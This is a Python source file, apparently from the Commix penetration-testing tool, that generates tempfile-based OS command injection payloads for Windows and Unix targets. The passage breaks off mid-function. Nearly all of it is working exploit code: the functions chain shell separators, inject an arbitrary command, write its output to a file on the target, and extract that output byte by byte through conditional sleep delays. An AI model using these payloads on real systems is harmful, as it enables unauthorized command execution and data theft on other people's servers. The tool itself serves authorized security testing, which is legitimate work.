#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib

"""
The "tempfile-based" technique on Semiblind OS Command Injection.
The available "tempfile-based" payloads.
"""

"""
Tempfile-based decision payload (check if host is vulnerable).
"""
def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "((Get-Content " + OUTPUT_TEXTFILE + ").length)\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                "((Get-Content " + OUTPUT_TEXTFILE + ").length)\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output.
                # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                # "then sleep 0" + separator +
                "then sleep " + str(timesec) + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0" + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "} " + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                "sleep " + str(timesec)
                )
      separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
                pipe + "tr -d '\\n'" +
                pipe + "wc -c) ] " + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") " + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                )
      # separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                # Find the length of the output, using readline().
                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.payload_newline_fixation(payload)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + pipe +
                "for /f \"tokens=*\" %y in ('cmd /c \"powershell.exe -InputFormat none "
                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                "do if %y==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\"" +
                # Transform to ASCII
                pipe +
                "for /f \"tokens=*\" %x in ('cmd /c \"" +
                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"')" + settings.SINGLE_WHITESPACE +
                "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + ampersand +
                "for /f \"tokens=*\" %y in ('cmd /c \"powershell.exe -InputFormat none "
                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                "do if %y==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\"" +
                # Transform to ASCII
                ampersand +
                "for /f \"tokens=*\" %x in ('cmd /c \"" +
                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"')" + settings.SINGLE_WHITESPACE +
                "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'"
                )
    else:
      pass
  else:
    settings.USER_APPLIED_CMD = cmd
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "echo $" + settings.RANDOM_VAR_GENERATOR + " > " + OUTPUT_TEXTFILE + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output.
                #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                # "then sleep 0 " + separator +
                "then sleep " + str(timesec) + separator +
                # Transform to ASCII
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 > " + OUTPUT_TEXTFILE + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0 " + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "echo $" + settings.RANDOM_VAR_GENERATOR + "" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output.
                #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                "sleep " + str(timesec) + separator +
                # Transform to ASCII
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                )
      # separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      cmd = cmd.rstrip()
      cmd = checks.add_command_substitution(cmd)
      payload = (pipe +
                cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + pipe +
                "tr -d '\\n'" + pipe + "wc -c) ]" + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass
  else:
    settings.USER_APPLIED_CMD = cmd
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                )
      # separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.payload_newline_fixation(payload)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass
  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                # Use space as delimiter
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                # "then sleep 0" + separator +
                "then sleep " + str(timesec) + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0" + separator +
                # Use space as delimiter
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}'<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                "sleep " + str(timesec)
                )
      separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
                pipe + "tr -d '\\n'" +
                pipe + "cut -c " + str(num_of_chars) +
                pipe + "od -N 1 -i" +
                pipe + "head -1" +
                pipe + "awk '{print$2}') ] " + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                )
      separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\") ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.payload_newline_fixation(payload)

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "if [ " + str(ord(str(ascii_char))) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                # "then sleep 0" + separator +
                "then sleep " + str(timesec) + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0" + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "[ " + str(ord(str(ascii_char))) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                "sleep " + str(timesec)
                )
      separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + ") ] " + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
